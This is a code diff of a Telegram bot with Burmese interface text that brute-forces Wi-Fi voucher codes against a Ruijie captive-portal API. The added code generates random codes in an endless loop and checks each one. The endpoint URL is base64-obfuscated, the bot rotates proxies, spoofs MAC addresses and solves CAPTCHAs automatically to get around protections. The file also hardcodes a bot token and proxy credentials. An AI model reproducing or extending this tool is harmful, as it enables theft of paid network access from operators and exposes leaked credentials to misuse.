@@ -9,7 +9,6 @@ GITHUB_TOKEN = '8971195833:AAGJVTAkqMI7UebWGC7dh2oY3CGvxPm-Zx4'
 REPO_OWNER = "makkqt"
 REPO_NAME = "yes"
 ADMINS = ["7366841341", "8728200516"]
-ADMIN_USERNAME = "@kuranomi | @makxcross_admin"
 
 PROXY_LIST = ["kdobnvaq:4y2b5qje1mhd@31.59.20.176:6754"] * 15
 _proxy_index = 0
@@ -22,38 +21,20 @@ def get_next_proxy():
 
 SUCCESS_CODE = asyncio.Queue()
 bot = AsyncTeleBot(BOT_TOKEN)
-user_data, scan_tasks, success_texts, success_messages = {}, {}, {}, {}
+user_data, scan_tasks, success_texts = {}, {}, {}
 VALID_KEYS, USER_KEYS = set(), {}
 session, _connector = None, None
-_voucher_sem = asyncio.Semaphore(1000)
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
 def is_admin(user_id):
     return str(user_id) in ADMINS
 
-async def get_file_content(path):
-    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
-    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
-    async with session.get(url, headers=headers) as resp:
-        if resp.status == 200:
-            data = await resp.json()
-            return json.loads(base64.b64decode(data['content']).decode()), data['sha']
-    return {}, None
-
-async def update_file_content(path, content, sha):
-    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
-    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/json"}
-    payload = {"message": "update", "content": base64.b64encode(json.dumps(content).encode()).decode(), "sha": sha}
-    async with session.put(url, headers=headers, json=payload) as resp:
-        return await resp.text()
-
-async def perform_check(session_url, code, chat_id, scan_id=None):
+async def perform_check(session_url, code, chat_id):
     post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
     for _ in range(3):
         proxy = get_next_proxy()
         timeout = aiohttp.ClientTimeout(total=30)
         async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as ts:
-            # Simple check wrapper
             try:
                 mac = ':'.join(f'{random.choice([2,6,10,14]):02x}' for _ in range(6))
                 s_url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
@@ -62,7 +43,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None):
                     if not s_id: continue
                     sessionId = s_id.group(1)
                 
-                # Captcha solve
                 async with ts.get(f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sessionId}', proxy=proxy) as img_req:
                     img_bytes = await img_req.read()
                 
@@ -79,7 +59,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None):
                     if 'logonUrl' in resp_text:
                         if chat_id not in success_texts: success_texts[chat_id] = []
                         success_texts[chat_id].append(f"🎫 {code}")
-                        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
                         await bot.send_message(chat_id, f"✅ Success Code Hit!\n\n🎫 {code}")
                         return
                     if 'request limited' not in resp_text:
@@ -105,6 +84,20 @@ def main_kb(is_adm):
     if is_adm: kb.add(InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_panel"))
     return kb
 
+def voucher_kb():
+    kb = InlineKeyboardMarkup(row_width=2)
+    kb.add(
+        InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
+        InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
+        InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
+        InlineKeyboardButton("🔤 VOUCHER ascii-lower", callback_data="scan_ascii-lower"),
+        InlineKeyboardButton("🎲 VOUCHER all", callback_data="scan_all"),
+        InlineKeyboardButton("🔤+🔢 MIXED 6လုံး", callback_data="scan_mixed"),
+        InlineKeyboardButton("🔤+🔢 MIXED 8လုံး", callback_data="scan_mixed8"),
+        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
+    )
+    return kb
+
 @bot.message_handler(commands=['start'])
 async def start(m):
     uid = str(m.chat.id)
@@ -120,6 +113,8 @@ async def callbacks(call):
 
     if call.data == "menu_back":
         await bot.edit_message_text("✨ STAR LINK BOT ✨", chat_id, call.message.message_id, reply_markup=main_kb(is_adm))
+    elif call.data == "menu_start_scam":
+        await bot.edit_message_text("🔢 ကျေးဇူးပြု၍ Voucher အမျိုးအစား ရွေးချယ်ပါ -", chat_id, call.message.message_id, reply_markup=voucher_kb())
     elif call.data == "admin_panel" and is_adm:
         kb = InlineKeyboardMarkup(row_width=1)
         kb.add(InlineKeyboardButton("➕ Key အသစ်ထုတ်မည်", callback_data="admin_gen_key"),
@@ -145,6 +140,31 @@ async def callbacks(call):
         await bot.edit_message_text("🔑 Key ထည့်ရန်: `/key [your_key]` ကို ပို့ပါ", chat_id, call.message.message_id, parse_mode="Markdown")
     elif call.data == "menu_free_trial":
         await bot.edit_message_text("🔗 Portal URL ထည့်ရန်: `/portal [url]` ကို ပို့ပါ။", chat_id, call.message.message_id)
+    elif call.data.startswith("scan_"):
+        mode = call.data.replace("scan_", "")
+        if chat_id not in user_data: user_data[chat_id] = {}
+        session_url = user_data[chat_id].get('session_url', '')
+        if not session_url:
+            await bot.answer_callback_query(call.id, "⚠️ ကျေးဇူးပြု၍ Portal URL အရင်ထည့်ပါ။", show_alert=True)
+            return
+        await bot.edit_message_text(f"🚀 Scanning started with mode: {mode}...", chat_id, call.message.message_id)
+        asyncio.create_task(run_scan_loop(mode, chat_id, session_url))
+
+async def run_scan_loop(mode, chat_id, session_url):
+    strings_map = {
+        "6": string.digits, "7": string.digits, "8": string.digits,
+        "ascii-lower": string.ascii_lowercase,
+        "all": string.ascii_lowercase + string.digits,
+        "mixed": string.ascii_lowercase + string.digits,
+        "mixed8": string.ascii_lowercase + string.digits
+    }
+    length = 8 if mode == "mixed8" else (6 if mode in ["ascii-lower", "all", "mixed"] else int(mode))
+    chars = strings_map.get(mode, string.digits)
+    
+    while True:
+        code = "".join(random.choices(chars, k=length))
+        await perform_check(session_url, code, chat_id)
+        await asyncio.sleep(0.1)
 
 @bot.message_handler(commands=['key'])
 async def handle_key(m):
@@ -173,3 +193,4 @@ async def main():
 
 if __name__ == '__main__':
     asyncio.run(main())
+
